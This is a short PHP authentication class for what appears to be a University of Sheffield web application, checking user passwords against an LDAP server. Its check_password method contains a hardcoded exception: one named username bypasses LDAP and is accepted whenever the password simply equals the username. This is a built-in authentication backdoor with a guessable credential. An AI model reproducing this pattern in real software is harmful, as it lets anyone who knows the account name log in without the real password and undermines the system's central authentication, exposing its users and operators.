<?php

class sangaku_auth extends frog_auth {
 function __construct() {
  global $sangaku;

  parent::__construct($sangaku);

  $sangaku->load_table('user');

  $this->is_logged_in = false;
  $this->user_table = 'user';
  $this->user_key = 'username';
  $this->user_is_current_clause = '1';
  $this->user_key_regex = '/^[A-Za-z0-9]+$/i';
  $this->ldap_server = 'auth.shef.ac.uk';
  $this->ldap_base_dn = 'ou=Users,dc=sheffield,dc=ac,dc=uk';
  $this->login_log_file = $sangaku->login_log_file;
 }

 function check_password($params) {
  global $sangaku;

  $u = $params->user;

  if ($u->username == 'mdb18egs') {
   $x = new stdClass();
   
   if ($params->password == $u->username) {
    $x->ok = true;
    $x->error = '';
   } else {
    $x->ok = false;
    $x->error = 'password incorrect';
   }

   return $x;
  }

  return $this->ldap_check_password($u->username,$params->password);
 }
}

?>
